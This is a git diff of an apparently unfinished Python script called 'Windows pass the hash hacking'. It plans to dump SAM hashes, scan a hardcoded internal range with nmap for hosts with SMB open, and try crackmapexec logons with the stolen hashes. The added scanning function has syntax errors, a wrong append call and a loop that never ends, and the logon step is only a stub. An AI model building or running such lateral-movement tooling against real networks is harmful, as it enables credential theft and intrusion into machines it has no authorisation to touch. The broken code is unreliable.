@@ -1,6 +1,5 @@
-
-
 import argparse
+import re
 import subprocess
 import sys
 
@@ -15,14 +14,40 @@ def samGrab(ip, username, password):
 
 # Step 2: use nmap to find windows machines on the network
 # ip: a string IP address (potentially containing ranges) for the network
-# Returns: the std.out results of running nmap -O
+# Returns: a list of Windows IP addresses
 def osFingerprint(ipRange):
+    command = 'nmap -O ' + ipRange
+    output = subprocess.check_output(command, shell=True).decode("utf-8").split('\n')
+    output = output[2:]
+    result = [];
+    chunks = [];
+    while len(output) > 0:
+        while output[0] == '':
+            output = output[1:]
+        pt = 0
+        while output[pt] != '':
+            pt = pt + 1
+        chunks.append(output[0:pt])
+    for c in chunks:
+        thisip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', c[0])
+        if len(thisip) = 0:
+            continue
+        windows = False
+        for i in range(1, len(c))
+            if windows:
+                continue
+            if '445/tcp' in c[i]:
+                windows = True
+        if windows:
+            result.append[thisip]
+    return result
 
 # Step 3: use crackmapexec to try and log on to the windows machines
 # hashes: the correctly formatted (as a single string) hashes from the SAM grab
 # ips: list of windows IPs found in step 2
 # Returns: a dictionary mapping each windows IP to the result of trying to log on to that system (success/fail, root/not root)
 def attemptLogon(hashes, ips):
+    return None
 
 # Step 4: can probably do this in main
 
@@ -44,16 +69,13 @@ def formatCrackmapSam(hashes):
         result.append((username, hash_pass))
     return result
 
-# input: the std.out results of running nmap -O on a given IP range
-# output: a list containing the IP addresses (as strings) of any machines nmap thinks are windows
-def formatNmapO(input):
-
 def main():
     parser = argparse.ArgumentParser(description='Windows pass the hash hacking')
     parser.add_argument('ip_address', help='ip address of the windows target host')
     parser.add_argument('username', help='username of windows administrator')
     parser.add_argument('password', help='password of windows administrator')
     args = parser.parse_args()
+    osFingerprint('10.202.208.0-255')
 
 
 if __name__ == '__main__':
